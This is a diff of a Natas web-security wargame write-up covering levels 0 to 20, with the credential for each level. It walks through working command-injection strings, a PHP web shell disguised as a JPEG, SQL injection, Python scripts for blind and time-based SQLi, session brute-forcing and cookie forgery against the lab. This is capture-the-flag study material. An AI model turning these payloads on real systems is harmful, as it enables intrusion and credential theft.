@@ -17,6 +17,7 @@ tags: [Web Security]
 ## Level 0
 
 Typing the username and password (natas0 by default) to be redirected to the level's website.
+
 Right-click and choose 'View page source' → receive the password for level 1.
 
 ![image](https://hackmd.io/_uploads/HJpqKxfnye.png)
@@ -26,11 +27,13 @@ The password for level 1 is **0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq**
 ## Level 1
 
 Logging in with the password found in the previous level.
+
 Visiting the website, I have received an message that the right-click function is disabled.
 
 ![image](https://hackmd.io/_uploads/HkvCAiG2kl.png)
 
 Searching for the shortcut to view page source.
+
 Pressing Ctrl + U, I see that the password is hidden in a comment.
 
 ![image](https://hackmd.io/_uploads/rkluSyhznJl.png)
@@ -40,6 +43,7 @@ The password for level 2: **TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI**
 ## Level 2
 
 Logging in with the password found in the previous level.
+
 Visiting the website, I have received a message:
 
 ![image](https://hackmd.io/_uploads/SJrPgnfh1x.png)
@@ -49,6 +53,7 @@ There's nothing in the page. So I try inspecting the website to find some hints.
 ![image](https://hackmd.io/_uploads/B1oiz3z3yg.png)
 
 I have found a suspicious image tag, the image is only in 1x1 pixel and even not appear in the website. The image is contained in a folder called **files**.
+
 Go to the source of the image by extending the link of the website.
 
 ![image](https://hackmd.io/_uploads/HkBH7nfhyx.png)
@@ -62,12 +67,15 @@ The password for level 3 is **3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH**
 ## Level 3
 
 Logging in with the password found in the previous level.
+
 As the level 2, there's nothing in the page. So I try inspecting the website to find more hints.
 
 ![image](https://hackmd.io/_uploads/SJzuU3GnJe.png)
 
 I have found a strange comment: 'No more information leak, not even Google will find it this time'.
+
 After a short research, I have known that there's a file called **robots.txt**, which used to manage what information of a website that can be searched and accessed through the Internet.
+
 Try going to the **robots.txt** file on this website by extend the link with **/robots.txt**.
 
 ![image](https://hackmd.io/_uploads/SJ4dPnf3yx.png)
@@ -89,18 +97,22 @@ Logging in with the password found in the previous level.
 ![image](https://hackmd.io/_uploads/rJVXRnGnkx.png)
 
 I have received a message: 'Access disallowed' and the reason refer to the 'source' of my request (it must be natas5 instead of natas4).
+
 I guess that this level asks me to change my 'source' to 'natas5'.
+
 Try refreshing website a few times.
 
 ![image](https://hackmd.io/_uploads/rkVWJafnyg.png)
 ![image](https://hackmd.io/_uploads/ByJ4JTz21x.png)
 
 The URL was appeared and changed, but it still from natas4.
+
 Let's make a little bit research to know how to change 'where I am from'.
 
 ![image](https://hackmd.io/_uploads/Bkz4g6Gn1g.png)
 
 This problem refers to a content named **Referer** in the HTML GET request.
+
 I think I can catch the request and change the **Referer** content in the request.
 
 ![image](https://hackmd.io/_uploads/rJupg6z2Jx.png)
@@ -120,11 +132,13 @@ The password for level 5 is **0n35PkggAPm2zbEpOU802c0x0Msn1ToK**
 ![image](https://hackmd.io/_uploads/Hyu37TM2Je.png)
 
 Going to the level's website, I have received a message 'You are not logged in'.
+
 I have no hints about the login function on this website. Let's inspect the website to find more hints.
 
 ![image](https://hackmd.io/_uploads/HJyf46M3yg.png)
 
 In the Cookies tab of this website, I found a cookies called 'loggedin' and it's current value is 0 (maybe it indicates that I haven't logged in).
+
 Try changing the cookies' value to 1 (or any number that's not equal to 0, I think) and reload the website.
 
 ![image](https://hackmd.io/_uploads/rJwoVaznJx.png)
@@ -136,12 +150,15 @@ The password for level 6: **0RoJwHdSKWFTYR5WuiAewauSuNaBXned**
 ![image](https://hackmd.io/_uploads/rkK3KaM3ye.png)
 
 Going to the level's website, I have received a form, it requires 'secret' (maybe something like a password). Currently, I don't have any hint about the 'secret', I have tried typing some random 'secret', but all of them are wrong.
+
 There's also a 'View sourcecode' button, try clicking on it, then I can view the source code of the website.
 
 ![image](https://hackmd.io/_uploads/H1A59azhke.png)
 
 There's maybe a PHP code contained in the source.
+
 It includes a file in the path: **includes/secret.inc**. The function of this code is to check if the 'secret' that user types is correct. The 'secret' is contained in the file **secret.inc**.
+
 Following that path by extending the link of the website:
 
 ![image](https://hackmd.io/_uploads/H18wj6MnJe.png)
@@ -151,6 +168,7 @@ An empty website, try inspecting it.
 ![image](https://hackmd.io/_uploads/BJIYiTf31e.png)
 
 I can see the 'secret' immediately in the HTML: **FOEIUWGHFEEUHOFUOIU**
+
 Back to the home page, submit and receive the password for level 7: **bmg8SvU1LizuWjx3y7xkNERkHxGre0GS**
 
 ## Level 7
@@ -158,12 +176,15 @@ Back to the home page, submit and receive the password for level 7: **bmg8SvU1Li
 ![image](https://hackmd.io/_uploads/r1wur-m31g.png)
 
 This is the main page of the website. There's 2 tabs: Home and About.
+
 Look at the URL, there's a parameter on it: **page**. Change between Home and About, the value pass to this parameter changes as same as the tabs.
+
 Try inspecting the website:
 
 ![image](https://hackmd.io/_uploads/SknZvWXhyg.png)
 
 There's a hint about the path where the password for level 8 is contained.
+
 Try changing the value of the parameter **page** to the path above, then I have successfully received the password for level 8: **xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q**
 
 ![image](https://hackmd.io/_uploads/HJ89vZXn1g.png)
@@ -173,13 +194,17 @@ Try changing the value of the parameter **page** to the path above, then I have 
 ![image](https://hackmd.io/_uploads/B1Q6OR73kg.png)
 
 The home page of this level is the same as level 6.
+
 There's no hint about the secret. Let's go to the source code.
 
 ![image](https://hackmd.io/_uploads/SJapt0X3yl.png)
 
 There's a short PHP code about encoding and decoding.
+
 To get the secret, I have to submit a string as a parameter of the function `encodeSecret`. If this function returns a string which is similar to `$encodeSecret`, the 'secret' will be revealed.
+
 To solve this, we try to decode `$encodeSecret`: **hex2bin → strrev → base64_decode**.
+
 This is a script written in Python to solve this problem:
 
 ```python
@@ -219,12 +244,14 @@ The home page is the same as level 8. There's no hint about the function 'Find w
 ![image](https://hackmd.io/_uploads/SJaRJ1V3Jl.png)
 
 There's a function to check if the input is contained in the file `dictionary.txt`.
+
 This function use `passthru`, which is able for me to exploit. Let's make a short research about `passthru`.
 
 ![image](https://hackmd.io/_uploads/Hkf_eJNhye.png)
 
 It seems that this function take a command as an input, execute it and print directly to the browser without any checking.
 In the PHP code given, the command is `grep -i $key dictionary.txt`, which means it returns the result of finding the word `key` in the file `dictionary.txt`.
+
 There're some ways to run multiple commands in 1 line. Let's make a short research.
 
 ![image](https://hackmd.io/_uploads/HJIP-yV31e.png)
@@ -234,7 +261,8 @@ It seems that I can use `&&` or `;` to seperate 2 commands. The difference is if
 ![image](https://hackmd.io/_uploads/HkSJfkE3ke.png)
 
 In the introduction of this wargame, there's a hint that all passwords are stored in `/etc/natas_webpass/natasX (X is the level)`.
-→ I will run 2 commands in 1 line: `hello ; cat /etc/natas_webpass/natas10`
+
+→ I will run these 2 commands in 1 line: `hello ; cat /etc/natas_webpass/natas10`
 
 ![image](https://hackmd.io/_uploads/SJBPQyEhye.png)
 
@@ -251,6 +279,7 @@ Let's go to the source code and explore how to bypass the filters.
 ![image](https://hackmd.io/_uploads/S1Zkq1Eh1e.png)
 
 This website now using `preg_match` to find if my input contains special characters: `/`, `[`, `;`, `&`, ... → this filter prevents me from using `;` or `&` like in the previous level.
+
 But if my input do not contains special characters above, I can still run commands by `passthru` → I must find a way to run commands without using special characters `;` or `&`.
 
 There's only a way left: grep command. Let's make a short research about this command.
@@ -258,6 +287,7 @@ There's only a way left: grep command. Let's make a short research about this co
 ![image](https://hackmd.io/_uploads/SykboyE31g.png)
 
 The `grep` command allows us to give multiple files for searching. So I can add the file containing the password: `/etc/natas_webpass/natas11`.
+
 But there's a problem: I don't know which string or character is contained in the password, so I try searching a letter only, if it's match, the password will be revealed.
 
 → Using this input: `a /etc/natas_webpass/natas11` (Only search for letter `a`, if it's not match, try another letter).
@@ -271,7 +301,9 @@ The password of the level 11 is: **UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk**
 ![image](https://hackmd.io/_uploads/ry7D3ZN2yg.png)
 
 There's a form, which allows me to set the background color by hexadecimal color.
+
 There's an message: 'Cookies are protected with XOR encryption'.
+
 Let's go to the source code to find some hints.
 
 ![image](https://hackmd.io/_uploads/rklZTZE3yx.png)
@@ -328,13 +360,18 @@ saveData($data);
 I have inspected the website and take the cookie `data` from storage: `HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D`
 
 The `defaultdata` has 2 fields: `array( "showpassword"=>"no", "bgcolor"=>"#ffffff")`;
+
 I have to change the value of the field `showpassword` to `yes` → the password will be revealed.
+
 But the problem is I don't have the key in `xor_encryption`. But I can find the ciphertext and the plaintext, then follow the formular: `ciphertext ^ plaintext = key` → get the `key`.
 
 Paying attention on this command:
 `$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);`
+
 Before being parameter on `xor_encrypt`, the cookie is base64 decoded.
+
 → I have to decode the cookie that I got from the website, this is the first paramter of `xor_encrypt`.
+
 Moreover, I have to `json_encode` the `defaultdata` → the ciphertext and plaintext have the same type of value → able to find the key.
 
 Ciphertext is the value I got from the cookie `data` on the website, Plaintext is the value of `defaultdata`:
@@ -377,7 +414,9 @@ Now I have plaintext (`defaultdata` with the value of the `showpassword` is `yes
 
 I have this command in `loadData` function:
 `$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);`
+
 This command convert cookie data to JSON data used to load background color (`defaultdata`).
+
 Now I have JSON data, I will process oppositely to the processing above:
 `json_encode` → `xor_encrypt` → `base64_encode`.
 
@@ -407,10 +446,13 @@ print(data)
 ```
 
 Add a letter `D` after the key because I have changed the value from `no` to `yes` → the new value have 1 letter more than the old one.
+
 ![image](https://hackmd.io/_uploads/Skr3oVN2ke.png)
 
 The cookie data: `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`
+
 Now change the value of the cookie `data` and receive the password for level 12.
+
 Password: **yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB**
 
 ## Level 12
@@ -470,14 +512,19 @@ if(array_key_exists("filename", $_POST)) {
 Let's make a short analysis on this php script:
 
 - The function `genRandomString` generates a 10-character string using `mt_rand` function (maybe `mt-19937`).
+
 - The function `makeRandomPath` generates a random path with 2 parameters: `dir` (direction) and `ext` (extension) → `dir/{genRandomString}.ext`.
+
 - The function `makeRandomPathFromFilename` get the uploaded file's extension and returns a random path using the function `makeRandomPath`.
+
 - The next script receives the uploaded file and creates path, then stores it on `target_path`, checks the file's size and stores it.
 
 In the PHP script, I do not see any command to check the extension of the file, but in HTML, the extension is `jpg`, website also asks to upload .jpg file.
+
 ![image](https://hackmd.io/_uploads/HJOUqrHhke.png)
 
 → Maybe I can upload a PHP script to print out the content (password) of the file: `/etc/natas_webpass/natas13`. But at first, the file's extension must be kept as `.php`.
+
 Let's make a short research to know how to keep the file's extension.
 
 ![image](https://hackmd.io/_uploads/Hy0_orr2kg.png)
@@ -499,6 +546,7 @@ The file's extension is automatically set to `.jpg`, let's change it to `.php`.
 ![image](https://hackmd.io/_uploads/ryz318H2ye.png)
 
 The file hass been successfully uploaded as `.php`.
+
 Let's click on the path to view
 
 ![image](https://hackmd.io/_uploads/ryg6kLrhJg.png)
@@ -572,6 +620,7 @@ This function reads the first bytes of an image. Let's research more to know abo
 ![image](https://hackmd.io/_uploads/SkfTDUrnJe.png)
 
 I have explored that `.jpg` files contain these bytes in the head of the file: `FF D8 FF E0`.
+
 → I only need to 'fake' these bytes in the first of the `.jpg` file, then insert PHP script to print out the password.
 
 ```shell=
@@ -580,6 +629,7 @@ echo "<?php system('cat /etc/natas_webpass/natas14'); ?>" >> shell.jpg
 ```
 
 Running these script in terminal to make the image file.
+
 Using the same skill used in the previous level to get the password.
 
 ![image](https://hackmd.io/_uploads/Byqlt8r3Jg.png)
@@ -618,7 +668,9 @@ if(array_key_exists("username", $_REQUEST)) {
 ```
 
 This is a basic SQL injection.
+
 The query: `$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";`
+
 Type in the `Username`: `" OR 1=1#` → make the password checking become a comment and make a bitwise operation OR between the username checking query and `1=1` (which is always return `true`) → login successfully.
 
 ![image](https://hackmd.io/_uploads/rJxrGwrnkl.png)
@@ -632,6 +684,7 @@ Password for level 15: **SdqIqBsFcz3yotlNYErZSZwblkm0lrvx**
 ![image](https://hackmd.io/_uploads/r1l6BDrnJg.png)
 
 The website allows me to check if a username is already existed.
+
 The sourcecode:
 
 ```php
@@ -675,7 +728,9 @@ This level looks tricky, it only gives us "This user exists" or "This user doesn
 
 It seems that the password of this user is also the password of level 16. Look at the query:
 `$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";`
+
 I think I can add another statement to check the password by bruteforcing each character. For example, let's check if the password contains letter `a` (then `b`, `c`, ...) → if the website returns `This user exists`, this means the password contains the letter above.
+
 Write a Python script to solve this task:
 
 ```python
@@ -737,6 +792,7 @@ The password for level 16: **hPkjKYviLQctEW33QmuXL6eDVfMW4sGo**
 ![image](https://hackmd.io/_uploads/Hy1Sqdr2Jg.png)
 
 Find words containing again!
+
 The sourcecode:
 
 ```php
@@ -764,11 +820,16 @@ There's an obvious missing by the filter: `$()`.
 ![image](https://hackmd.io/_uploads/SyUM5st21e.png)
 
 `$()` contains a command, this command is executed in a subshell. If it returns a value or something like that, the output is placed in the original command.
+
 → I can do something like:
 `$(<command>)word` → if the command returns an output, it is attached with the word → this "new word" will not match with any word in the dictionary → returns nothing.
+
 On the other hand, if the command does not return an output, the word is still the word, after searching, some words have appeared.
+
 → I can brute-force each letter of the password, the value returned is 'true' or 'false'.
+
 If this value is true, it will change the word → there's nothing after searching. If it is false, there're results after searching.
+
 Let's write a short Python script to do this task.
 
 ```python
@@ -806,6 +867,7 @@ Password for level 17: **EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC**
 ![image](https://hackmd.io/_uploads/ryKYT3F2ke.png)
 
 There's a form to check the existence of a username.
+
 Source code:
 
 ```php
@@ -844,9 +906,13 @@ if(array_key_exists("username", $_REQUEST)) {
 ```
 
 Another SQL injection challenge.
+
 This level is different from level 15, as the website does not return anything to the screen because the `echo` commands is in comments.
+
 I have to find other ways to know whether a username is existing.
+
 I can try applying 'Time-based blind SQL injection', it means adding a sleep() when the return value is true, to distinguish it from the false one.
+
 Write a short Python script like the previous level:
 
 ```python
@@ -888,6 +954,7 @@ The password of level 18 is **6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ**
 ![image](https://hackmd.io/_uploads/Bymd6W2nyx.png)
 
 There isn't any hint about the `admin account`.
+
 Source code:
 
 ```php
@@ -989,8 +1056,11 @@ function print_credentials() {
 This function is used to print password if `_SESSION` is not empty, consists (key, value) = (admin, 1).
 
 `$_SESSION["admin"] = isValidAdminLogin();` This command in the main function always set `$_SESSION["admin"] = 0.` → There's no way that a new user typing username and password, then become admin.
+
 → `my_session_start()` must return true.
+
 But this function returns true when the `PHPSESSID` is contained in cookie that sent to server through requests. `PHPSESSID` is maybe admin's `session_id`. If we have this ID, we can 'borrow' admin privilege.
+
 A user's `session_id` is random from 1 to 640 → I can brute-force this number easily.
 
 This is a short Python script to solve this task:
@@ -1025,13 +1095,16 @@ The password of level 19 is **tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr**
 ![image](https://hackmd.io/_uploads/ryA9x7231l.png)
 
 Mostly the same as level 18, but now the session_id is no longer sequential (not a random number between 1 and 640).
+
 Let's try logging in with some different random accounts to find out the formular of the session_id.
 
 ![image](https://hackmd.io/_uploads/H1I7-723kx.png)
 
 This is a hex value: `3432322d6e6861746e616d`.
 Converting to ascii: `422-nhatnam` (I have logged in with the username `nhatnam`).
+
 → The formular of the session_id is `X-username` with `X` is a random number (maybe) between 1 and 640.
+
 Same approach like the previous level: brute-force the `X` number.
 
 ```python
@@ -1063,4 +1136,227 @@ The password of level 20 is **p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw**
 
 ## Level 20
 
-[Keep updating...]
+![image](lv20-1.png)
+
+Source code:
+
+```php
+<?php
+
+function debug($msg) {
+    if(array_key_exists("debug", $_GET)) {
+        print "DEBUG: $msg<br>";
+    }
+}
+
+function print_credentials() {
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas21\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
+    }
+}
+
+/* we don't need this */
+function myopen($path, $name) {
+    //debug("MYOPEN $path $name");
+    return true;
+}
+
+/* we don't need this */
+function myclose() {
+    //debug("MYCLOSE");
+    return true;
+}
+
+function myread($sid) {
+    debug("MYREAD $sid");
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return "";
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    if(!file_exists($filename)) {
+        debug("Session file doesn't exist");
+        return "";
+    }
+    debug("Reading from ". $filename);
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+    $parts = explode(" ", $line, 2);
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    }
+    return session_encode() ?: "";
+}
+
+function mywrite($sid, $data) {
+    // $data contains the serialized version of $_SESSION
+    // but our encoding is better
+    debug("MYWRITE $sid $data");
+    // make sure the sid is alnum only!!
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return;
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    $data = "";
+    debug("Saving in ". $filename);
+    ksort($_SESSION);
+    foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+    return true;
+}
+
+/* we don't need this */
+function mydestroy($sid) {
+    //debug("MYDESTROY $sid");
+    return true;
+}
+/* we don't need this */
+function mygarbage($t) {
+    //debug("MYGARBAGE $t");
+    return true;
+}
+
+session_set_save_handler(
+    "myopen",
+    "myclose",
+    "myread",
+    "mywrite",
+    "mydestroy",
+    "mygarbage");
+session_start();
+
+if(array_key_exists("name", $_REQUEST)) {
+    $_SESSION["name"] = $_REQUEST["name"];
+    debug("Name set to " . $_REQUEST["name"]);
+}
+
+print_credentials();
+
+$name = "";
+if(array_key_exists("name", $_SESSION)) {
+    $name = $_SESSION["name"];
+}
+
+?>
+```
+
+Starting with the function `session_start()`, it initializes a session or loads existing session through `session_id` (stored in browser cookies).
+
+Let's make a short research to know clearly how this function works.
+
+![image](lv20-2.png)
+
+As I see, when this function is called, PHP need to know if any session is working. It finds `PHPSESSID` in parameters in GET/ POST request or Cookies. If `PHPSESSID` is existing, PHP resumes the old session. Otherwise, it initializes a new session.
+
+This function works based on `session handlers`, which is manually initialized in this program through `session_set_save_handler()` method. In particularly, I need to pay attention on `read` handler and `write` handler.
+
+How does the `read` handler work? It receives Session ID, which is stored as `serialized`, for example:
+
+```plaintext
+a:2:{s:8:"username";s:5:"Alice";s:5:"role";s:5:"admin";}
+```
+
+PHP calls `unserialize()` to convert the data above into `$_SESSION` array, for example:
+
+```plaintext
+$_SESSION = [
+    "username" => "Alice",
+    "role" => "admin"
+];
+```
+
+The `write` handler is used to store session's data to file or database.
+
+Let's explore how these 2 functions work in this PHP prorgam.
+
+```php
+function myread($sid) {
+    debug("MYREAD $sid");
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return "";
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    if(!file_exists($filename)) {
+        debug("Session file doesn't exist");
+        return "";
+    }
+    debug("Reading from ". $filename);
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+    $parts = explode(" ", $line, 2);
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    }
+    return session_encode() ?: "";
+}
+
+function mywrite($sid, $data) {
+    // $data contains the serialized version of $_SESSION
+    // but our encoding is better
+    debug("MYWRITE $sid $data");
+    // make sure the sid is alnum only!!
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID");
+        return;
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    $data = "";
+    debug("Saving in ". $filename);
+    ksort($_SESSION);
+    foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+    return true;
+}
+```
+
+As I have explained before, the function `myread` receives `sid` as a parameter, which is currently in unserialized (array) form and stored in `data`.
+
+Look at this script in `myread`:
+
+```php
+foreach(explode("\n", $data) as $line) {
+    debug("Read [$line]");
+    $parts = explode(" ", $line, 2);
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+}
+```
+
+This foreach loop divides `data` into seperated lines. In each line, data is formatted as `{key, value}` format.
+
+`if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];`: this script checks if the key is valid (not empty) and stores session data in `$_SESSION` array as `{key, value}` format:
+
+`$_SESSION[$parts[0]] = $parts[1]`
+
+Then `myread` returns session data as encoded.
+
+In `mywrite` function, it receives session data and also stores data as `{key, value}` format.
+
+In `print_credentials()` function, it requires that the session data should have a field called `admin` (key) and it's value is `1`, then the password will be revealed.
+
+To send the session data to server, I can do it through URL's parameters.
+
+This is the correctly URL:
+
+```plaintext
+http://natas20.natas.labs.overthewire.org/index.php?name=admin%0Aadmin%201
+```
+
+![image](lv20-3.png)
+
+Password: **BPhv63cKE1lkQl04cE5CuFTzXe15NfiH**
